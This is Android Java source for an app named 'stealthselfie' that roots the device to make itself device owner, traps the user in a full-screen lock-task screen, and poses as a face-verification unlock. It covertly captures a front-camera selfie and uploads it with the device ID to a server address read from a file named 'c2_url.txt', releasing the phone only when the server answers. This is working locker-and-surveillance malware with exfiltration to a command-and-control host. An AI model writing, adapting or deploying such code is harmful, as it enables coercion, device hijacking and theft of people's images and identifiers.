package com.stealthselfie;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.Matrix;
import android.hardware.Camera;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

@SuppressWarnings("deprecation")
public class MainActivity extends Activity implements SurfaceHolder.Callback, Camera.FaceDetectionListener {

    private static final String TAG = "SystemLockout";
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    private Camera camera;
    private SurfaceView surfaceView;
    private SurfaceHolder surfaceHolder;
    private Button verifyButton;
    private TextView statusText;
    private boolean isFaceDetected = false;
    private boolean isUploading = false;
    private int frontCameraId = -1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);

        // Show over lockscreen
        setShowWhenLocked(true);
        setTurnScreenOn(true);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);

        // Build UI Programmatically
        FrameLayout layout = new FrameLayout(this);
        layout.setBackgroundColor(Color.BLACK);

        surfaceView = new SurfaceView(this);
        surfaceHolder = surfaceView.getHolder();
        surfaceHolder.addCallback(this);
        
        FrameLayout.LayoutParams svParams = new FrameLayout.LayoutParams(800, 800, Gravity.CENTER);
        layout.addView(surfaceView, svParams);

        statusText = new TextView(this);
        statusText.setText("Position your face within the circle");
        statusText.setTextColor(Color.WHITE);
        statusText.setTextSize(20);
        FrameLayout.LayoutParams textParams = new FrameLayout.LayoutParams(FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT, Gravity.BOTTOM | Gravity.CENTER_HORIZONTAL);
        textParams.bottomMargin = 300;
        layout.addView(statusText, textParams);

        verifyButton = new Button(this);
        verifyButton.setText("VERIFY & UNLOCK");
        verifyButton.setEnabled(false);
        verifyButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (camera != null && !isUploading) {
                    isUploading = true;
                    verifyButton.setText("Uploading...");
                    verifyButton.setEnabled(false);
                    statusText.setText("Uploading for verification...");
                    statusText.setTextColor(Color.WHITE);
                    camera.takePicture(null, null, new Camera.PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            uploadPicture(data);
                        }
                    });
                }
            }
        });

        FrameLayout.LayoutParams btnParams = new FrameLayout.LayoutParams(600, 150, Gravity.BOTTOM | Gravity.CENTER_HORIZONTAL);
        btnParams.bottomMargin = 100;
        layout.addView(verifyButton, btnParams);

        setContentView(layout);
        hideSystemUI();
        
        findFrontCamera();
    }

    @Override
    protected void onResume() {
        super.onResume();
        setupLockout();
    }

    private void findFrontCamera() {
        int numCameras = Camera.getNumberOfCameras();
        for (int i = 0; i < numCameras; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                frontCameraId = i;
                break;
            }
        }
    }

    private void setupLockout() {
        if (!dpm.isDeviceOwnerApp(getPackageName())) {
            try {
                Log.d(TAG, "Requesting Device Owner status via root...");
                Runtime.getRuntime().exec("su -c dpm set-device-owner " + getPackageName() + "/.AdminReceiver").waitFor();
            } catch (Exception e) {
                Log.e(TAG, "Failed to set Device Owner", e);
            }
        }

        try {
            if (dpm.isDeviceOwnerApp(getPackageName())) {
                dpm.setLockTaskPackages(adminComponent, new String[]{getPackageName()});
                startLockTask();
            } else {
                startLockTask();
            }
        } catch (Exception e) {
            Log.e(TAG, "Lock Task initialization failed", e);
        }
    }

    private void hideSystemUI() {
        getWindow().setDecorFitsSystemWindows(false);
        WindowInsetsController controller = getWindow().getInsetsController();
        if (controller != null) {
            controller.hide(WindowInsets.Type.statusBars() | WindowInsets.Type.navigationBars());
            controller.setSystemBarsBehavior(WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
        }
    }

    @Override
    public void onBackPressed() {
        // Suppress
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        if (frontCameraId == -1) return;
        try {
            camera = Camera.open(frontCameraId);
            camera.setPreviewDisplay(holder);
            camera.setDisplayOrientation(90); // Portrait
            camera.setFaceDetectionListener(this);
            camera.startPreview();
            
            Camera.Parameters params = camera.getParameters();
            if (params.getMaxNumDetectedFaces() > 0) {
                camera.startFaceDetection();
            }
        } catch (Exception e) {
            Log.e(TAG, "Camera error", e);
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        if (camera != null) {
            camera.stopFaceDetection();
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    @Override
    public void onFaceDetection(Camera.Face[] faces, Camera camera) {
        if (!isUploading) {
            if (faces.length > 0) {
                isFaceDetected = true;
                verifyButton.setEnabled(true);
                statusText.setText("FACE DETECTED - CAPTURING");
                statusText.setTextColor(Color.GREEN);
                verifyButton.performClick(); // Auto-capture when face is detected
            } else {
                isFaceDetected = false;
                verifyButton.setEnabled(false);
                statusText.setText("Position your face within the circle");
                statusText.setTextColor(Color.WHITE);
            }
        }
    }

    private void uploadPicture(final byte[] data) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Rotate image
                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                    Matrix matrix = new Matrix();
                    matrix.postRotate(270);
                    Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
                    
                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                    rotated.compress(Bitmap.CompressFormat.JPEG, 85, stream);
                    byte[] jpegData = stream.toByteArray();

                    File urlFile = new File("/data/local/tmp/c2_url.txt");
                    String uploadUrl = "http://localhost:8000/api/upload-selfie";
                    if (urlFile.exists()) {
                        BufferedReader br = new BufferedReader(new FileReader(urlFile));
                        String wsUrl = br.readLine();
                        if (wsUrl != null && !wsUrl.isEmpty()) {
                            uploadUrl = wsUrl.replace("ws://", "http://").replace("/ws", "/api/upload-selfie");
                        }
                        br.close();
                    }

                    String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                    if (deviceId == null) deviceId = "unknown";

                    String boundary = "*****";
                    URL url = new URL(uploadUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoInput(true);
                    conn.setDoOutput(true);
                    conn.setUseCaches(false);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Connection", "Keep-Alive");
                    conn.setRequestProperty("X-Device-ID", deviceId);
                    conn.setRequestProperty("X-Timestamp", String.valueOf(System.currentTimeMillis()));
                    conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                    DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                    dos.writeBytes("--" + boundary + "\r\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\"selfie\";filename=\"selfie.jpg\"\r\n");
                    dos.writeBytes("Content-Type: image/jpeg\r\n\r\n");
                    dos.write(jpegData);
                    dos.writeBytes("\r\n");
                    dos.writeBytes("--" + boundary + "--\r\n");
                    dos.flush();
                    dos.close();

                    final int responseCode = conn.getResponseCode();
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            isUploading = false;
                            if (responseCode == 200) {
                                try {
                                    stopLockTask();
                                } catch (Exception e) {}
                                finishAffinity();
                            } else {
                                verifyButton.setText("VERIFY & UNLOCK");
                                statusText.setText("Server Error " + responseCode);
                                statusText.setTextColor(Color.RED);
                                if (camera != null) {
                                    camera.startPreview();
                                    camera.startFaceDetection();
                                }
                            }
                        }
                    });

                } catch (final Exception e) {
                    Log.e(TAG, "Upload failed", e);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            isUploading = false;
                            verifyButton.setText("VERIFY & UNLOCK");
                            statusText.setText("Network error");
                            statusText.setTextColor(Color.RED);
                            if (camera != null) {
                                camera.startPreview();
                                camera.startFaceDetection();
                            }
                        }
                    });
                }
            }
        }).start();
    }
}
